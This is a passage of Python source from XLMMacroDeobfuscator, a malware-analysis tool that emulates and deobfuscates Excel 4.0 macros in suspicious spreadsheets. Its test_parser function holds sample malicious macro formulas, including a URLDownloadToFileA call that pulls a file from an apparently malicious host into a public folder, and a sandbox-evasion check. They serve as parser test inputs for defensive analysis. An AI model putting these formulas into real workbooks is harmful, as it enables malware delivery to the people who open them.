                if top_record['status'] is True:
                    next_cell = top_record['start_point']
            self._indent_level = self._indent_level -1 if self._indent_level >0 else 0
            self._indent_current_line = True
        else:
            self.next_count -=1

        if next_cell is None:
            status = EvalStatus.IGNORED

        return EvalResult(next_cell, status, 0, 'NEXT')

    # endregion

    def evaluate_parse_tree(self, current_cell, parse_tree_root, interactive=True):
        next_cell = None
        status = EvalStatus.NotImplemented
        text = None
        return_val = None

        if type(parse_tree_root) is Token:
            text = parse_tree_root.value
            status = EvalStatus.FullEvaluation
            return_val = text
            result = EvalResult(next_cell, status, return_val, text)

        elif type(parse_tree_root) is list:
            return_val = text = ''
            status = EvalStatus.FullEvaluation
            result = EvalResult(next_cell, status, return_val, text)

        elif parse_tree_root.data == 'function_call':
            result = self.evaluate_function(current_cell, parse_tree_root, interactive)

        elif parse_tree_root.data == 'method_call':
            result = self.evaluate_method(current_cell, parse_tree_root, interactive)

        elif parse_tree_root.data == 'cell':
            result = self.evaluate_cell(current_cell, interactive, parse_tree_root)

        elif parse_tree_root.data == 'range':
            result = self.evaluate_range(current_cell, interactive, parse_tree_root)

        elif parse_tree_root.data in self._expr_rule_names:
            text_left = None
            concat_status = EvalStatus.FullEvaluation
            for index, child in enumerate(parse_tree_root.children):
                if type(child) is Token and child.type in ['ADDITIVEOP', 'MULTIOP', 'CMPOP', 'CONCATOP']:

                    op_str = str(child)
                    right_arg = parse_tree_root.children[index + 1]
                    right_arg_eval_res = self.evaluate_parse_tree(current_cell, right_arg, interactive)
                    text_right = right_arg_eval_res.get_text(unwrap=True)

                    if op_str == '&':
                        if left_arg_eval_res.status == EvalStatus.FullEvaluation and right_arg_eval_res.status == EvalStatus.PartialEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.PartialEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        elif left_arg_eval_res.status == EvalStatus.PartialEvaluation and right_arg_eval_res.status == EvalStatus.FullEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.FullEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        elif left_arg_eval_res.status == EvalStatus.PartialEvaluation and right_arg_eval_res.status == EvalStatus.PartialEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.PartialEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        else:
                            text_left = text_left + text_right
                    elif left_arg_eval_res.status == EvalStatus.FullEvaluation and right_arg_eval_res.status == EvalStatus.FullEvaluation:
                        status = EvalStatus.FullEvaluation
                        value_right = right_arg_eval_res.value
                        if self.is_float(value_left) and self.is_float(value_right):
                            if op_str in self._operators:
                                op_res = self._operators[op_str](float(value_left), float(value_right))
                                if type(op_res) == bool:
                                    value_left = str(op_res)
                                elif op_res.is_integer():
                                    value_left = str(int(op_res))
                                else:
                                    op_res = round(op_res, 10)
                                    value_left = str(op_res)
                            else:
                                value_left = 'Operator ' + op_str
                                left_arg_eval_res.status = EvalStatus.NotImplemented
                        else:
                            if op_str in self._operators:
                                value_left = EvalResult.unwrap_str_literal(str(value_left))
                                value_right = EvalResult.unwrap_str_literal(str(value_right))
                                op_res = self._operators[op_str](value_left, value_right)
                                value_left = op_res
                            else:
                                value_left = self.convert_ptree_to_str(parse_tree_root)
                                left_arg_eval_res.status = EvalStatus.PartialEvaluation
                        text_left = value_left
                    else:
                        left_arg_eval_res.status = EvalStatus.PartialEvaluation
                        text_left = '{}{}{}'.format(text_left, op_str, text_right)
                    return_val = text_left
                else:
                    if text_left is None:
                        left_arg = parse_tree_root.children[index]
                        left_arg_eval_res = self.evaluate_parse_tree(current_cell, left_arg, interactive)
                        text_left = left_arg_eval_res.get_text(unwrap=True)
                        value_left = left_arg_eval_res.value

            if concat_status == EvalStatus.PartialEvaluation and left_arg_eval_res.status == EvalStatus.FullEvaluation:
                left_arg_eval_res.status = concat_status

            result = EvalResult(next_cell, left_arg_eval_res.status, return_val, EvalResult.wrap_str_literal(text_left))

        elif parse_tree_root.data == 'final':
            arg = parse_tree_root.children[1]
            result = self.evaluate_parse_tree(current_cell, arg, interactive)

        else:
            status = EvalStatus.FullEvaluation
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    child_eval_result = self.evaluate_parse_tree(current_cell, child_node, interactive)
                    if child_eval_result.status != EvalStatus.FullEvaluation:
                        status = child_eval_result.status

            result = EvalResult(child_eval_result.next_cell, status, child_eval_result.value, child_eval_result.text)

        return result

    def evaluate_cell(self, current_cell, interactive, parse_tree_root):
        sheet_name, col, row = self.get_cell_addr(current_cell, parse_tree_root)
        return_val = ''
        text = ''
        status = EvalStatus.PartialEvaluation

        if sheet_name is not None:
            cell_addr = col + str(row)
            sheet = self.xlm_wrapper.get_macrosheets()[sheet_name]

            if cell_addr not in sheet.cells and (sheet_name, cell_addr) in self.cell_with_unsuccessfull_set:
                if interactive:
                    self.invoke_interpreter = True
                    if self.first_unknown_cell is None:
                        self.first_unknown_cell = cell_addr

            if cell_addr in sheet.cells:
                cell = sheet.cells[cell_addr]
                if cell.value is not None:
                    text = EvalResult.wrap_str_literal( cell.value)
                    return_val = text
                    status = EvalStatus.FullEvaluation

                elif cell.formula is not None:
                    parse_tree = self.xlm_parser.parse(cell.formula)
                    eval_result = self.evaluate_parse_tree(current_cell, parse_tree, False)
                    return_val = eval_result.value
                    text = eval_result.get_text()
                    status = eval_result.status

                else:
                    text = "{}".format(cell_addr)
            else:
                if (sheet_name, cell_addr) in self.cell_with_unsuccessfull_set:
                    text = "{}".format(cell_addr)
                else:
                    text = ''
                    status = EvalStatus.FullEvaluation
        else:
            text = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def evaluate_range(self, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if len(parse_tree_root.children) >= 3:
            start_address = self.get_cell_addr(current_cell, parse_tree_root.children[0])
            end_address = self.get_cell_addr(current_cell, parse_tree_root.children[2])
            selected = None
            if len(parse_tree_root.children) == 5:
                selected = self.get_cell_addr(current_cell, parse_tree_root.children[4])
            self.selected_range = (start_address, end_address, selected)
            status = EvalStatus.FullEvaluation
        text = self.convert_ptree_to_str(parse_tree_root)
        retunr_val = 0

        return EvalResult(None, status, retunr_val, text)


    def interactive_shell(self, current_cell, message):
        print('\nProcess Interruption:')
        print('CELL:{:10}{}'.format(current_cell.get_local_address(), current_cell.formula))
        print(message)
        print('Enter XLM macro:')
        print('Tip: CLOSE() or HALT() to exist')

        while True:
            line = input()
            line = '=' + line.strip()
            if line:
                try:
                    parse_tree = self.xlm_parser.parse(line)
                    next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, parse_tree,
                                                                                   interactive=False)
                    print(return_val)
                    if status == EvalStatus.End:
                        break
                except ParseError as exp:
                    print("Invalid XLM macro")
                except KeyboardInterrupt:
                    sys.exit()
            else:
                break

    def has_loop(self, path, length=10):
        if len(path) < length * 2:
            return False
        else:
            result = False
            start_index = len(path) - length

            for j in range(0, start_index - length):
                matched = True
                k = j
                while start_index + k - j < len(path):
                    if path[k] != path[start_index + k - j]:
                        matched = False
                        break
                    k += 1
                if matched:
                    result = True
                    break
            return result

    def deobfuscate_macro(self, interactive, start_point=""):
        result = []

        auto_open_labels = self.xlm_wrapper.get_defined_name('auto_open', full_match=False)
        if len(auto_open_labels) == 0:
            if len(start_point) > 0:
                auto_open_labels = [('auto_open', start_point)]
            elif interactive:
                print('There is no entry point, please specify a cell address to start')
                print('Example: Sheet1!A1')
                auto_open_labels = [('auto_open', input().strip())]

        if auto_open_labels is not None and len(auto_open_labels) > 0:
            macros = self.xlm_wrapper.get_macrosheets()

            for auto_open_label in auto_open_labels:
                try:
                    sheet_name, col, row = Cell.parse_cell_addr(auto_open_label[1])
                    if sheet_name in macros:
                        current_cell = self.get_formula_cell(macros[sheet_name], col, row)
                        self._branch_stack = [(current_cell, current_cell.formula, macros[sheet_name].cells, 0, '')]
                        observed_cells = []
                        while len(self._branch_stack) > 0:
                            current_cell, formula, saved_cells, indent_level, desc = self._branch_stack.pop()
                            macros[current_cell.sheet.name].cells = saved_cells
                            self._indent_level = indent_level
                            stack_record = True
                            while current_cell is not None:
                                if type(formula) is str:
                                    parse_tree = self.xlm_parser.parse(formula)
                                else:
                                    parse_tree = formula
                                if stack_record:
                                    previous_indent = self._indent_level - 1 if self._indent_level > 0 else 0
                                else:
                                    previous_indent = self._indent_level


                                evaluation_result = self.evaluate_parse_tree(current_cell, parse_tree, interactive)

                                if len(self._while_stack)== 0 and evaluation_result.text != 'NEXT':
                                    observed_cells.append(current_cell.get_local_address())

                                    if self.has_loop(observed_cells):
                                        break

                                if self.invoke_interpreter and interactive:
                                    self.interactive_shell(current_cell,
                                                           'Partial Eval: {}\r\n{} is not populated, what should be its value?'.format(
                                                               evaluation_result.text,
                                                               self.first_unknown_cell))
                                    self.invoke_interpreter = False
                                    self.first_unknown_cell = None
                                    continue

                                if evaluation_result.value is not None:
                                    current_cell.value = str(evaluation_result.value)
                                if evaluation_result.next_cell is None and \
                                        (evaluation_result.status == EvalStatus.FullEvaluation or
                                         evaluation_result.status == EvalStatus.PartialEvaluation or
                                         evaluation_result.status == EvalStatus.NotImplemented or
                                         evaluation_result.status == EvalStatus.IGNORED):
                                    evaluation_result.next_cell = self.get_formula_cell(current_cell.sheet,
                                                                                        current_cell.column,
                                                                                        str(int(current_cell.row) + 1))
                                if stack_record:
                                    evaluation_result.text = (desc + ' ' + evaluation_result.get_text(unwrap=False)).strip()

                                if self._indent_current_line:
                                    previous_indent = self._indent_level
                                    self._indent_current_line = False

                                if evaluation_result.status != EvalStatus.IGNORED:
                                    yield (current_cell, evaluation_result.status, evaluation_result.get_text(unwrap=False), previous_indent)

                                if evaluation_result.next_cell is not None:
                                    current_cell = evaluation_result.next_cell
                                else:
                                    break
                                formula = current_cell.formula
                                stack_record = False
                except Exception as exp:
                    print('Error: ' + str(exp))


def test_parser():
    grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro-en.lark')
    macro_grammar = open(grammar_file_path, 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar, parser='lalr')

    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print("\n=171*GET.CELL(19,A81)")
    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(r'\n=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")')
    print(xlm_parser.parse(r'=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")'))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


_thismodule_dir = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
_parent_dir = os.path.normpath(os.path.join(_thismodule_dir, '..'))
if _parent_dir not in sys.path:
    sys.path.insert(0, _parent_dir)


def get_file_type(path):
    file_type = None
    with open(path, 'rb') as input_file:
        start_marker = input_file.read(2)
        if start_marker == b'\xD0\xCF':
            file_type = 'xls'
        elif start_marker == b'\x50\x4B':
            file_type = 'xlsm/b'
    if file_type == 'xlsm/b':
        raw_bytes = open(path, 'rb').read()
        if bytes('workbook.bin', 'ascii') in raw_bytes:
            file_type = 'xlsb'
        else:
            file_type = 'xlsm'
    return file_type


def show_cells(excel_doc):
    macrosheets = excel_doc.get_macrosheets()
    auto_open_labels = excel_doc.get_defined_name('auto_open', full_match=False)

    for macrosheet_name in macrosheets:
        # yield 'SHEET: {}, {}'.format(macrosheets[macrosheet_name].name,
        #                                macrosheets[macrosheet_name].type)

        yield macrosheets[macrosheet_name].name, macrosheets[macrosheet_name].type

        for formula_loc, info in macrosheets[macrosheet_name].cells.items():
            if info.formula is not None:
                yield info, 'EXTRACTED', info.formula, '', info.value
                # yield 'CELL:{:10}, {:20}, {}'.format(formula_loc, info.formula, info.value)
        for formula_loc, info in macrosheets[macrosheet_name].cells.items():
            if info.formula is None:
                # yield 'CELL:{:10}, {:20}, {}'.format(formula_loc, str(info.formula), info.value)
                yield info, 'EXTRACTED', str(info.formula), '', info.value,


def uprint(*objects, sep=' ', end='\n', file=sys.stdout, silent_mode=False):
    if silent_mode:
        return

    enc = file.encoding
    if enc == 'UTF-8':
        print(*objects, sep=sep, end=end, file=file)
    else:
        f = lambda obj: str(obj).encode(enc, errors='backslashreplace').decode(enc)
        print(*map(f, objects), sep=sep, end=end, file=file)


def get_formula_output(interpretation_result, format_str, with_index=True):
    cell_addr = interpretation_result[0].get_local_address()
    status = interpretation_result[1]
    formula = interpretation_result[2]
    indent = ''.join(['\t'] * interpretation_result[3])
    result = ''
    if format_str is not None and type(format_str) is str:
        result = format_str
        result = result.replace('[[CELL_ADDR]]', '{:10}'.format(cell_addr))
        result = result.replace('[[STATUS]]', '{:20}'.format(status.name))
        if with_index:
            formula = indent + formula
        result = result.replace('[[INT-FORMULA]]', formula)

    return result


def convert_to_json_str(file, defined_names, records):
    file_content = open(file, 'rb').read()
    md5 = hashlib.md5(file_content).hexdigest()
    sha256 = hashlib.sha256(file_content).hexdigest()

    res = {'file_path': file, 'md5_hash': md5, 'sha256_hash': sha256, 'analysis_timestamp': int(time.time()),
           'format_version': 1, 'analyzed_by': 'XLMMacroDeobfuscator',
           'link': 'https://github.com/DissectMalware/XLMMacroDeobfuscator', 'defined_names': defined_names,
           'records': []}

    for index, i in enumerate(records):
        if len(i) == 4:
            res['records'].append({'index': index,
                                   'sheet': i[0].sheet.name,
                                   'cell_add': i[0].get_local_address(),
                                   'status': str(i[1]),
                                   'formula': i[2]})
        elif len(i) == 5:
            res['records'].append({'index': index,
                                   'sheet': i[0].sheet.name,
                                   'cell_add': i[0].get_local_address(),
                                   'status': str(i[1]),
                                   'formula': i[2],
                                   'value': str(i[4])})

    return res


def get_logo():
    return """
          _        _______
|\     /|( \      (       )
( \   / )| (      | () () |
 \ (_) / | |      | || || |
  ) _ (  | |      | |(_)| |
 / ( ) \ | |      | |   | |
( /   \ )| (____/\| )   ( |
|/     \|(_______/|/     \|
   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/

    """


def process_file(**kwargs):
    """ Example of kwargs when using as library
    {
        'file': '/tmp/8a6e4c10c30b773147d0d7c8307d88f1cf242cb01a9747bfec0319befdc1fcaf',
        'noninteractive': True,
        'extract_only': False,
        'no_ms_excel': True,
        'with_ms_excel': False,
        'start_with_shell': False,
        'return_deobfuscated': True,
        'day': 0,
        'output_formula_format': 'CELL:[[CELL_ADDR]], [[STATUS]], [[INT-FORMULA]]',
        'start_point': ''
    }
    """
    deobfuscated = list()
    interpreted_lines = list()
    file_path = os.path.abspath(kwargs.get("file"))
    file_type = get_file_type(file_path)

    uprint('File: {}\n'.format(file_path), silent_mode=SILENT)

    if file_type is None:
        return ('ERROR: input file type is not supported')

    try:
        start = time.time()
        excel_doc = None

        uprint('[Loading Cells]', silent_mode=SILENT)
        if file_type == 'xls':
            if kwargs.get("no_ms_excel", False):
                print('--with-ms-excel switch is now deprecated (by default, MS-Excel is not used)\n'
                      'If you want to use MS-Excel, use --with-ms-excel')

            if not kwargs.get("with_ms_excel", False):
                excel_doc = XLSWrapper2(file_path)
            else:
                try:
                    excel_doc = XLSWrapper(file_path)

                except Exception as exp:
                    print("Error: MS Excel is not installed, now xlrd2 library will be used insteads\n" +
                          "(Use --no-ms-excel switch if you do not have/want to use MS Excel)")
                    excel_doc = XLSWrapper2(file_path)
        elif file_type == 'xlsm':
            excel_doc = XLSMWrapper(file_path)
        elif file_type == 'xlsb':
            excel_doc = XLSBWrapper(file_path)
        if excel_doc is None:
            return ("File format is not supported")

        auto_open_labels = excel_doc.get_defined_name('auto_open', full_match=False)
        for label in auto_open_labels:
            uprint('auto_open: {}->{}'.format(label[0], label[1]))

        if kwargs.get("extract_only"):
            if kwargs.get("export_json"):
                records = []
                for i in show_cells(excel_doc):
                    if len(i) == 5:
                        records.append(i)

                uprint('[Dumping to Json]', silent_mode=SILENT)
                res = convert_to_json_str(file_path, excel_doc.get_defined_names(), records)

                try:
                    output_file_path = kwargs.get("export_json")
                    with open(output_file_path, 'w', encoding='utf_8') as output_file:
                        output_file.write(json.dumps(res, indent=4))
                        uprint('Result is dumped into {}'.format(output_file_path), silent_mode=SILENT)
                except Exception as exp:
                    print('Error: unable to dump the result into the specified file\n{}'.format(str(exp)))
                uprint('[End of Dumping]', SILENT)

                if not kwargs.get("return_deobfuscated"):
                    return res
            else:
                res = []
                for i in show_cells(excel_doc):
                    rec_str = ''
                    if len(i) == 2:
                        rec_str = 'SHEET: {}, {}'.format(i[0], i[1])
                    elif len(i) == 5:
                        rec_str = 'CELL:{:10}, {:20}, {}'.format(i[0].get_local_address(), i[2], i[4])
                    if rec_str:
                        if not kwargs.get("return_deobfuscated"):
                            uprint(rec_str)
                        res.append(rec_str)

                if kwargs.get("return_deobfuscated"):
                    return res

        else:
            uprint('[Starting Deobfuscation]', silent_mode=SILENT)
            interpreter = XLMInterpreter(excel_doc)
            if kwargs.get("day", 0) > 0:
                interpreter.day_of_month = kwargs.get("day")

            interactive = not kwargs.get("noninteractive")

            if kwargs.get("start_with_shell"):
                starting_points = interpreter.xlm_wrapper.get_defined_name('auto_open', full_match=False)
                if len(starting_points) == 0:
                    if len(kwargs.get("start_point")) > 0:
                        starting_points = [('auto_open', kwargs.get("start_point"))]
                    elif interactive:
                        print('There is no entry point, please specify a cell address to start')
                        print('Example: Sheet1!A1')
                        auto_open_labels = [('auto_open', input().strip())]
                sheet_name, col, row = Cell.parse_cell_addr(starting_points[0][1])
                macros = interpreter.xlm_wrapper.get_macrosheets()
                if sheet_name in macros:
                    current_cell = interpreter.get_formula_cell(macros[sheet_name], col, row)
                    interpreter.interactive_shell(current_cell, "")

            output_format = kwargs.get("output_formula_format", 'CELL:[[CELL_ADDR]], [[STATUS]], [[INT-FORMULA]]')
            start_point = kwargs.get("start_point", '')

            for step in interpreter.deobfuscate_macro(interactive, start_point):
                if kwargs.get("return_deobfuscated"):
                    deobfuscated.append(
                        get_formula_output(step, output_format, not kwargs.get("no_indent")))
                elif kwargs.get("export_json"):
                    interpreted_lines.append(step)
                else:
                    uprint(get_formula_output(step, output_format, not kwargs.get("no_indent")))
            uprint('[END of Deobfuscation]', silent_mode=SILENT)

            if kwargs.get("export_json"):
                uprint('[Dumping Json]', silent_mode=SILENT)
                res = convert_to_json_str(file_path, excel_doc.get_defined_names(), interpreted_lines)
                try:
                    output_file_path = kwargs.get("export_json")
                    with open(output_file_path, 'w', encoding='utf_8') as output_file:
                        output_file.write(json.dumps(res, indent=4))
                        uprint('Result is dumped into {}'.format(output_file_path), silent_mode=SILENT)
                except Exception as exp:
                    print('Error: unable to dump the result into the specified file\n{}'.format(str(exp)))

                uprint('[End of Dumping]', silent_mode=SILENT)
                if kwargs.get("return_deobfuscated"):
                    return res

        uprint('time elapsed: ' + str(time.time() - start), silent_mode=SILENT)
    finally:
        if HAS_XLSWrapper and type(excel_doc) is XLSWrapper:
            excel_doc._excel.Application.DisplayAlerts = False
            excel_doc._excel.Application.Quit()

    if kwargs.get("return_deobfuscated"):
        return deobfuscated


def main():
    print(get_logo())
    print('XLMMacroDeobfuscator(v {}) - {}\n'.format(__version__,
                                                     "https://github.com/DissectMalware/XLMMacroDeobfuscator"))
    arg_parser = argparse.ArgumentParser()

    arg_parser.add_argument("-f", "--file", type=str, action='store',
                            help="The path of a XLSM file", metavar=('FILE_PATH'))
    arg_parser.add_argument("-n", "--noninteractive", default=False, action='store_true',
                            help="Disable interactive shell")
    arg_parser.add_argument("-x", "--extract-only", default=False, action='store_true',
                            help="Only extract cells without any emulation")
    arg_parser.add_argument("-2", "--no-ms-excel", default=False, action='store_true',
                            help="[Deprecated] Do not use MS Excel to process XLS files")
    arg_parser.add_argument("--with-ms-excel", default=False, action='store_true',
                            help="Use MS Excel to process XLS files")
    arg_parser.add_argument("-s", "--start-with-shell", default=False, action='store_true',
                            help="Open an XLM shell before interpreting the macros in the input")
    arg_parser.add_argument("-d", "--day", type=int, default=-1, action='store',
                            help="Specify the day of month", )
    arg_parser.add_argument("--output-formula-format", type=str,
                            default="CELL:[[CELL_ADDR]], [[STATUS]], [[INT-FORMULA]]",
                            action='store',
                            help="Specify the format for output formulas ([[CELL_ADDR]], [[INT-FORMULA]], and [[STATUS]]", )
    arg_parser.add_argument("--no-indent", default=False, action='store_true',
                            help="Do not show indent before formulas")
    arg_parser.add_argument("--export-json", type=str, action='store',
                            help="Export the output to JSON", metavar=('FILE_PATH'))
    arg_parser.add_argument("--start-point", type=str, default="", action='store',
                            help="Start interpretation from a specific cell address", metavar=('CELL_ADDR'))

    args = arg_parser.parse_args()

    if not args.file:
        arg_parser.print_help()
    elif not os.path.exists(args.file):
        print('Error: input file does not exist')
    else:
        try:
            # Convert args to kwarg dict
            process_file(**vars(args))
        except KeyboardInterrupt:
            pass


SILENT = False
if __name__ == '__main__':
    main()
